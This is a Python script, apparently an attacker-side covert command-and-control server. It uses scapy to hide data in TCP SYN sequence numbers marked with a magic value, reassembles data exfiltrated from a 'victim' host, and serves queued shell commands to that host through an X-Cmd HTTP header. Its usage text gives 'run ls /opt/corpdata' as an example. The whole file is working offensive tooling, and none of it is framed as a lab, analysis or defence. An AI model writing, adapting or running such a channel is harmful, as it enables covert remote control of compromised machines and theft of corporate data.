#!/usr/bin/env python3
from scapy.all import *
import struct
import time
import threading
import socket

MAGIC        = 0xCAFE0000
MAGIC_MASK   = 0xFFFF0000
LISTEN_PORT  = 80
HTTP_PORT    = 80

expected_bytes = None
received       = b""
victim_ip      = None
victim_sport   = None
pending_cmd    = None

def is_covert(pkt):
    return (TCP in pkt and
            pkt[TCP].flags == 0x02 and
            (pkt[TCP].seq & MAGIC_MASK) == MAGIC)

def send_covert(message: str, dst_ip: str, dst_port: int):
    data = message.encode()
    length = len(data)
    seq_len = MAGIC | (length & 0xFFFF)
    pkt = IP(dst=dst_ip) / TCP(dport=dst_port, flags="SA", seq=seq_len)
    send(pkt, verbose=False)
    time.sleep(0.2)
    for i in range(0, len(data), 2):
        chunk = data[i:i+2]
        if len(chunk) < 2:
            chunk += b'\x00'
        value = struct.unpack(">H", chunk)[0]
        pkt = IP(dst=dst_ip) / TCP(dport=dst_port, flags="SA", seq=MAGIC | value)
        send(pkt, verbose=False)
        time.sleep(0.2)
    print(f"[+] Sent covert: {message[:80]}{'...' if len(message)>80 else ''}")

def process(pkt):
    global expected_bytes, received, victim_ip, victim_sport

    if not is_covert(pkt):
        return

    victim_ip    = pkt[IP].src
    victim_sport = pkt[TCP].sport
    low16        = pkt[TCP].seq & 0xFFFF

    if expected_bytes is None:
        expected_bytes = low16
        received = b""
        print(f"[*] Incoming covert data — expecting {expected_bytes} bytes")
    else:
        chunk = struct.pack(">H", low16)
        received += chunk
        if len(received) >= expected_bytes:
            msg = received[:expected_bytes].decode(errors='replace')
            print(f"\n[+] Received:\n{msg}\n[>] ", end="", flush=True)
            expected_bytes = None
            received = b""

def http_server():
    global pending_cmd
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", HTTP_PORT))
    srv.listen(5)
    while True:
        conn, addr = srv.accept()
        data = conn.recv(1024).decode(errors='replace')
        if pending_cmd:
            resp = (f"HTTP/1.0 200 OK\r\n"
                    f"X-Cmd: {pending_cmd}\r\n"
                    f"\r\n")
            pending_cmd = None
        else:
            resp = "HTTP/1.0 200 OK\r\n\r\n"
        conn.send(resp.encode())
        conn.close()

def input_loop():
    global pending_cmd
    print("\n[*] Commands:")
    print("    run <cmd>    — execute a command on the victim (e.g. run ls /opt/corpdata)")
    print("    exit         — quit\n")
    while True:
        try:
            cmd = input("[>] ").strip()
        except EOFError:
            break
        if cmd == "exit":
            break
        elif cmd.startswith("run "):
            pending_cmd = cmd[4:].strip()
            print(f"[*] Command queued: {pending_cmd}")
            print("[*] Waiting for next victim beacon...")
        else:
            print("[!] Unknown command. Use: run <cmd>, exit")

threading.Thread(target=http_server, daemon=True).start()
threading.Thread(target=lambda: sniff(filter="tcp dst port 80", prn=process, store=False), daemon=True).start()

print("[*] Covert C2 ready. Waiting for victim beacon...")
input_loop()
